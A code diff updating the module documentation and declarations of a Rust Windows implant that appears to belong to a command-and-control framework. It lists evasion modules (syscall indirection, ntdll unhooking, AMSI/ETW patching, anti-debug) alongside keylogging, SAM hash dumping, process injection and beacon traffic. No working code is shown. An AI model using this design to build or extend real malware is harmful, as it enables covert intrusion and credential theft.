@@ -17,20 +17,28 @@
 //!
 //! ## Modules
 //! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
-//! - [`resolve`] — PEB walk + djb2 API resolution; bridges to `nyx_evasion`
-//!   so the SSN resolver runs over the *live* ntdll. (Windows-only.)
-//! - [`ntalloc`] — NT-Heap `GlobalAlloc`.
-//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll gadget +
-//!   trampoline); 4/6/11-arg wrappers + a process-wide global accessor.
+//! - [`ntalloc`] — bump allocator over `NtAllocateVirtualMemory`, registered as
+//!   the `#[global_allocator]` (the `NtHeapAllocator` name is historical).
+//! - [`resolve`] — PEB walk + djb2 API resolution; `LiveNtdll` impls
+//!   `nyx_evasion::SyscallSource` so the SSN resolver runs over the *live* ntdll.
+//! - [`syscalls`] — indirect-syscall runtime (SSN table + ntdll `syscall;ret`
+//!   gadget + RX trampoline); 4/6/11-arg wrappers + a process-wide global.
+//! - [`unhook`] — KnownDlls `\ntdll` fresh-map (+ disk fallback) unhook.
+//! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
+//! - [`antidebug`] — BeingDebugged / ProcessDebugPort / uptime checks.
+//! - [`kits`] — CS-style kit seams: `SleepmaskKit`/`ProcessInjectKit` (no-op
+//!   defaults; real impls are P2). [`stack`]/[`sleep`]/[`mem`] are the matching
+//!   skeletons (call-stack spoof / sleep mask — not yet wired).
 //! - [`config`] — per-build encrypted config (`nyx_config_macros::embed!`).
+//! - [`beacon`] — the task loop (check-in → POST → receive → execute); every
+//!   wire `Command`. [`envelopes`] bakes the malleable-C2 shapes it sends.
+//! - [`transport`] — WinHTTP POST for the beacon frame (TLS via WINHTTP_FLAG_SECURE).
 //! - [`hostinfo`] — real `SessionInfo` (hostname/user/pid/admin/beacon_id).
-//! - [`fs`] — Upload/Download/FileOp via NT syscalls.
-//! - [`shell`] — `Shell` via `CreateProcessW` + redirected pipes.
-//! - [`recon`] — DriveInfo/Env/Clipboard/Portscan/Net.
+//! - [`fs`] / [`shell`] / [`recon`] — file ops (NT syscalls), shell, recon.
 //! - [`bof`] — W^X COFF loader + Beacon-API shims.
-//! - [`blind`] / [`unhook`] — AMSI/ETW patch + KnownDlls NTDLL unhook.
-//! - [`transport`] — WinHTTP POST for the beacon frame.
-//! - [`entry`] — PIC entry + selftests.
+//! - [`screenshot`] / [`keylog`] / [`hashdump`] — screen, polling keys, SAM hive.
+//! - [`pivot`] / [`postex`] — SOCKS relay across cycles / token ops.
+//! - [`entry`] / [`selftests`] — PIC entry + per-module `rundll32` self-tests.
 
 #![no_std]
 #![no_main]
@@ -64,11 +72,15 @@ pub mod envelopes;
 #[cfg(target_os = "windows")]
 pub mod entry;
 #[cfg(target_os = "windows")]
+pub mod evasion_glue;
+#[cfg(target_os = "windows")]
 pub mod fs;
 #[cfg(target_os = "windows")]
 pub mod hashdump;
 #[cfg(target_os = "windows")]
 pub mod hostinfo;
+#[cfg(target_os = "windows")]
+pub mod inject;
 #[cfg(target_os = "windows")]
 pub mod keylog;
 #[cfg(target_os = "windows")]
